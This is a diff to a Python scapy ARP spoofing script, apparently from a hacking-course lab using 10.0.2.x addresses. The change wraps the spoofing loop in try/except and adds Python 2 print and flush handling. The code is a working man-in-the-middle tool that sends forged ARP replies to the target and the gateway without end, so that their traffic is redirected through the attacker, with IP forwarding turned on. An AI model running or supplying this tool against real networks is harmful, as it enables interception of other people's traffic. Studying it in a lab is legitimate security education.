@@ -8,6 +8,7 @@ ip_forward needs to be enabled : echo 1 > /proc/sys/net/ipv4/ip_forward
 
 import scapy.all as scapy
 import time
+import sys
 
 def get_mac(ip):
     # the next two lines creates a packet that asks for a specific ip
@@ -31,9 +32,16 @@ def spoof(target_ip, spoof_ip):
     scapy.send(packet, verbose=False)
     
 sent_packets_num = 0
-while True:
-    spoof("10.0.2.2", "10.0.2.1")
-    spoof("10.0.2.1", "10.0.2.2")
-    sent_packets_num+=2
-    print("\rPackets sent: " + str(sent_packets_num), end="")
-    time.sleep(2)
+
+try:
+    while True:
+        spoof("10.0.2.2", "10.0.2.1")
+        spoof("10.0.2.1", "10.0.2.2")
+        sent_packets_num+=2
+        #python3: print("\rPackets sent: " + str(sent_packets_num), end="")
+        #python2: 
+        print("\rPackets sent: " + str(sent_packets_num)),
+        sys.stdout.flush()
+        time.sleep(2)
+except:
+    print("quitting...")
